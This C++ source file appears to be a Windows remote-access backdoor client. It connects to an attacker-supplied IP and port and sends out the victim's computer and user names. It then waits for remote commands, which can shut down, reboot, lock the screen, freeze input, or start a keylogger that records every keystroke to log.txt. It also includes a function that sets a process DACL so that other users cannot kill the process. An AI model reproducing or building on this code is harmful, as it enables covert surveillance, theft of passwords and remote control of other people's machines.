#include"common.h"
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#define MSG_LEN 1024
#define MSG_LENN 5120

char* ServerIp;
int ServerPort;

void c_socket()
{
	puts("m-1");
	// 初始化 Winsock
	WSADATA wsaData;
	//struct hostent *host;
	//struct in_addr addr;

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
	}

	// 建立socket socket.
	SOCKET client;
	client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (client == INVALID_SOCKET) {
		printf("Error at socket(): %d\n", WSAGetLastError());
		WSACleanup();
		return;
	}

	//获取主机名、用户名
	const int MAX_BUFFER_LEN = 500;
	char userName[MAX_BUFFER_LEN];
	char comName[MAX_BUFFER_LEN];
	char comInfo[MAX_BUFFER_LEN];
	DWORD nameLen;
	DWORD comLen;
	nameLen = MAX_BUFFER_LEN;
	comLen = MAX_BUFFER_LEN;
	GetUserName(userName, &nameLen);
	GetComputerName(comName, &comLen);
	snprintf(comInfo, sizeof(comInfo), "%s@%s", comName, userName);
	//sprintf(comInfo, "%s@%s", comName, userName);

	// 连接到服务器.
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.S_un.S_addr = inet_addr(ServerIp);
	clientService.sin_port = htons(ServerPort);
	puts("m2");
	while (1) {
		if (connect(client, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
			puts("m3");
			Sleep(20000);
			continue;
		}
		else {
			puts("m4");
			send(client, comInfo, strlen(comInfo), 0);
			break;
		}
	}

	puts("m1");
	//阻塞等待服务端指令
	char recvCmd[MSG_LEN] = { 0 };
	char message[MSG_LENN + 10] = { 0 };
	while (1) {
		ZeroMemory(recvCmd, sizeof(recvCmd));
		ZeroMemory(message, sizeof(message));

		//从服务端获取数据
		recv(client, recvCmd, MSG_LEN, 0);
		if (strlen(recvCmd)<1) {  //SOCKET中断重连
			closesocket(client);
			while (1) {
				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				if (connect(client, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
					//printf( "\nFailed to connect.\nWait 10s...\n" );
					Sleep(20000);
					continue;
				}
				else {
					send(client, comInfo, strlen(comInfo), 0);
					break;
				}
			}
			continue;
		}
		else if (strcmp(recvCmd, "shutdown") == 0) {  //关机
			system("shutdown -s -t 1");
			continue;
		}
		else if (strcmp(recvCmd, "reboot") == 0) {  //重启
			system("shutdown -r -t 10");
			continue;
		}
		else if (strcmp(recvCmd, "cancel") == 0) {  //取消关机
			system("shutdown -a");
			continue;
		}
		else if (strcmp(recvCmd, "close") == 0) {  //关闭客户端
			send(client, "Client has exit!", 16, 0);
			exit(0);
		}
		else if (strcmp(recvCmd, "screenshot") == 0) {  //截屏
			continue;
		}
		else if (strcmp(recvCmd, "lock") == 0) { //锁屏
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
			continue;
		}
		else if (strcmp(recvCmd, "blockinput") == 0) { //冻结鼠标和键盘
			BlockInput(true);
			Sleep(5000);
			BlockInput(false);
			continue;
		}
		else if (strcmp(recvCmd, "keylogger") == 0)//键盘记录
		{
			char keylog[MAX_PATH];
			GetCurrentDirectoryA(MAX_PATH,keylog);
			//getcwd(keylog, MAX_PATH);//direct.h not support in mingw
			string keylogs = keylog;
			string FileName = keylogs + "\\log.txt";
			string KeyName = "";
			fstream FileStream;
			FileStream.open(FileName.c_str(), std::fstream::out | std::fstream::app);
			while (1)
			{
				Sleep(5);
				for (int i = 8; i <= 255; i++)
				{
					if ((GetAsyncKeyState(i) & 1) == 1)               //判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
					{
						KeyName = GetKeyName(i);
						FileStream.write(KeyName.c_str(), KeyName.size());
						FileStream.close();                                //写完一次就保存一次
						FileStream.open(FileName.c_str(), std::fstream::out | std::fstream::app);
					}
				}

			}
		}
		else if (strcmp(recvCmd, "download") == 0) { //上传文件
			continue;
		}
		else if (strcmp(recvCmd, "upload") == 0) { //下载文件
			continue;
		}
		else {
			continue;
		}
	}
	WSACleanup();
	return;
}

string GetKeyName(int NumKey)
{
	bool IS_SHIFT = JudgeShift();
	string revalue = "";
	puts("m2");
	//判断键盘中间的特殊符号
	if (NumKey >= 186 && NumKey <= 222)
		switch (NumKey)
		{
		case 186:
			if (IS_SHIFT)
				revalue = ":";
			else
				revalue = ";";
			break;
		case 187:
			if (IS_SHIFT)
				revalue = "+";
			else
				revalue = "=";
			break;
		case 188:
			if (IS_SHIFT)
				revalue = "<";
			else
				revalue = ",";
			break;
		case 189:
			if (IS_SHIFT)
				revalue = "_";
			else
				revalue = "-";
			break;
		case 190:
			if (IS_SHIFT)
				revalue = ">";
			else
				revalue = ".";
			break;
		case 191:
			if (IS_SHIFT)
				revalue = "?";
			else
				revalue = "/";
			break;
		case 192:
			if (IS_SHIFT)
				revalue = "~";
			else
				revalue = "`";
			break;
		case 219:
			if (IS_SHIFT)
				revalue = "{";
			else
				revalue = "[";
			break;
		case 220:
			if (IS_SHIFT)
				revalue = "|";
			else
				revalue = "\\";
			break;
		case 221:
			if (IS_SHIFT)
				revalue = "}";
			else
				revalue = "]";
			break;
		case 222:
			if (IS_SHIFT)
				revalue = '"';
			else
				revalue = ",";
		default:
			revalue = "error";
			break;
		}


	if (NumKey == VK_ESCAPE) // 退出
		revalue = "[Esc]";
	else if (NumKey == VK_F1) // F1至F12
		revalue = "[F1]";
	else if (NumKey == VK_F2)
		revalue = "[F2]";
	else if (NumKey == VK_F3)
		revalue = "[F3]";
	else if (NumKey == VK_F4)
		revalue = "[F4]";
	else if (NumKey == VK_F5)
		revalue = "[F5]";
	else if (NumKey == VK_F6)
		revalue = "[F6]";
	else if (NumKey == VK_F7)
		revalue = "[F7]";
	else if (NumKey == VK_F8)
		revalue = "[F8]";
	else if (NumKey == VK_F9)
		revalue = "[F9]";
	else if (NumKey == VK_F10)
		revalue = "[F10]";
	else if (NumKey == VK_F11)
		revalue = "[F11]";
	else if (NumKey == VK_F12)
		revalue = "[F12]";
	else if (NumKey == VK_SNAPSHOT) // 打印屏幕
		revalue = "[PrScrn]";
	else if (NumKey == VK_SCROLL) // 滚动锁定
		revalue = "[Scroll Lock]";
	else if (NumKey == VK_PAUSE) // 暂停、中断
		revalue = "[Pause]";
	else if (NumKey == VK_CAPITAL) // 大写锁定
		revalue = "[Caps Lock]";
	else if (NumKey == 8) //<- 回格键
		revalue = "[Backspace]";
	else if (NumKey == VK_RETURN) // 回车键、换行
		revalue = "[Enter]\n";
	else if (NumKey == VK_SPACE) // 空格
		revalue = " ";
	else if (NumKey == VK_TAB) // 制表键
		revalue = "[Tab]";
	else if (NumKey == VK_LCONTROL) // 左控制键
		revalue = "[Ctrl]";
	else if (NumKey == VK_RCONTROL) // 右控制键
		revalue = "[CTRL]";
	else if (NumKey == VK_LMENU) // 左换档键
		revalue = "[Alt]";
	else if (NumKey == VK_LMENU) // 右换档键
		revalue = "[ALT]";
	else if (NumKey == VK_LWIN) // 右 WINDOWS 键
		revalue = "[Win]";
	else if (NumKey == VK_RWIN) // 右 WINDOWS 键
		revalue = "[WIN]";
	else if (NumKey == VK_APPS) // 键盘上 右键
		revalue = "右键";
	else if (NumKey == VK_INSERT) // 插入
		revalue = "[Insert]";
	else if (NumKey == VK_DELETE) // 删除
		revalue = "[Delete]";
	else if (NumKey == VK_HOME) // 起始
		revalue = "[Home]";
	else if (NumKey == VK_END) // 结束
		revalue = "[End]";
	else if (NumKey == VK_PRIOR) // 上一页
		revalue = "[PgUp]";
	else if (NumKey == VK_NEXT) // 下一页
		revalue = "[PgDown]";
	// 不常用的几个键:一般键盘没有
	else if (NumKey == VK_CANCEL) // Cancel
		revalue = "[Cancel]";
	else if (NumKey == VK_CLEAR) // Clear
		revalue = "[Clear]";
	else if (NumKey == VK_SELECT) //Select
		revalue = "[Select]";
	else if (NumKey == VK_PRINT) //Print
		revalue = "[Print]";
	else if (NumKey == VK_EXECUTE) //Execute
		revalue = "[Execute]";

	//----------------------------------------//
	else if (NumKey == VK_LEFT) //上、下、左、右键
		revalue = "[←]";
	else if (NumKey == VK_RIGHT)
		revalue = "[→]";
	else if (NumKey == VK_UP)
		revalue = "[↑]";
	else if (NumKey == VK_DOWN)
		revalue = "[↓]";
	else if (NumKey == VK_NUMLOCK)//小键盘数码锁定
		revalue = "[NumLock]";
	else if (NumKey == VK_ADD) // 加、减、乘、除
		revalue = "+";
	else if (NumKey == VK_SUBTRACT)
		revalue = "-";
	else if (NumKey == VK_MULTIPLY)
		revalue = "*";
	else if (NumKey == VK_DIVIDE)
		revalue = "/";
	else if (NumKey == 190 || NumKey == 110) // 小键盘 . 及键盘 .
		revalue = ".";
	//小键盘数字键:0-9
	else if (NumKey == VK_NUMPAD0)
		revalue = "0";
	else if (NumKey == VK_NUMPAD1)
		revalue = "1";
	else if (NumKey == VK_NUMPAD2)
		revalue = "2";
	else if (NumKey == VK_NUMPAD3)
		revalue = "3";
	else if (NumKey == VK_NUMPAD4)
		revalue = "4";
	else if (NumKey == VK_NUMPAD5)
		revalue = "5";
	else if (NumKey == VK_NUMPAD6)
		revalue = "6";
	else if (NumKey == VK_NUMPAD7)
		revalue = "7";
	else if (NumKey == VK_NUMPAD8)
		revalue = "8";
	else if (NumKey == VK_NUMPAD9)
		revalue = "9";
	//----------------------------上述代码判断键盘上除了字母之外的功能键--------------------------------//
	else if (NumKey >= 65 && NumKey <= 90)
	{
		if (GetKeyState(VK_CAPITAL))
		{
			if (IS_SHIFT)
				revalue = NumKey + 32;
			else
				revalue = NumKey;
		}
		else
		{
			if (IS_SHIFT)
				revalue = NumKey;
			else
				revalue = NumKey + 32;
		}
	}
	//---------------------------上面的部分判断键盘上的字母----------------------------------------------//
	else if (NumKey >= 48 && NumKey <= 57)
	{
		if (IS_SHIFT)
		{
			switch (NumKey)
			{
			case 48:revalue = ")"; break;
			case 49:revalue = "!"; break;
			case 50:revalue = "@"; break;
			case 51:revalue = "#"; break;
			case 52:revalue = "$"; break;
			case 53:revalue = "%"; break;
			case 54:revalue = "^"; break;
			case 55:revalue = "&"; break;
			case 56:revalue = "*"; break;
			case 57:revalue = "("; break;
			}
		}
		else
		{
			switch (NumKey)
			{
			case 48:revalue = "0"; break;
			case 49:revalue = "1"; break;
			case 50:revalue = "2"; break;
			case 51:revalue = "3"; break;
			case 52:revalue = "4"; break;
			case 53:revalue = "5"; break;
			case 54:revalue = "6"; break;
			case 55:revalue = "7"; break;
			case 56:revalue = "8"; break;
			case 57:revalue = "9"; break;
			}
		}
	}
	return revalue;
}

bool JudgeShift()
{
	int iShift = GetKeyState(0x10); //判断Shift键状态
	bool IS = (iShift & KeyBoardValue) == KeyBoardValue; //表示按下Shift键
	if (IS)
		return 1;
	else
		return 0;
}


BOOL Ring3ProtectProcess()
{
	HANDLE 		hProcess;
	SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
	PSID 		pSid;
	BOOL 		bSus = FALSE;
	HANDLE 		hToken;
	DWORD 		dwReturnLength;
	LPVOID 		TokenInformation;
	PTOKEN_USER 	pTokenUser;
	BYTE 		Buf[0x200];
	PACL 		pAcl;
DWORD dw;

	hProcess = ::GetCurrentProcess();
	bSus = ::AllocateAndInitializeSid(&sia, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);
	if (!bSus) goto cleanup;
	bSus = ::OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
	if (!bSus) goto cleanup;
	::GetTokenInformation(hToken, TokenUser, NULL, 0, &dwReturnLength);
	if (dwReturnLength > 0x400) goto cleanup;
	TokenInformation = ::LocalAlloc(LPTR, 0x400);//这里就引用SDK的函数不引用CRT的了  
	bSus = ::GetTokenInformation(hToken, TokenUser, TokenInformation, 0x400, &dw);
	if (!bSus) goto cleanup;
	pTokenUser = (PTOKEN_USER)TokenInformation;
	pAcl = (PACL)&Buf;
	bSus = ::InitializeAcl(pAcl, 1024, ACL_REVISION);
	if (!bSus) goto cleanup;
	bSus = ::AddAccessDeniedAce(pAcl, ACL_REVISION, 0xFFFFFFFF, pSid);
	if (!bSus) goto cleanup;
	bSus = ::AddAccessAllowedAce(pAcl, ACL_REVISION, 0x00100701, pTokenUser->User.Sid);
	if (!bSus) goto cleanup;
	if (::SetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pAcl, NULL) == 0)
		bSus = TRUE;

cleanup:
	if (hProcess != NULL)
		::CloseHandle(hProcess);
	if (pSid != NULL)
		::FreeSid(pSid);
	return bSus;
}


int main(int argc, char** argv)
{
	//Ring3ProtectProcess();
	ServerIp = argv[1];
	ServerPort = atoi(argv[2]);
	//starting();
	c_socket();
	return 0;
}
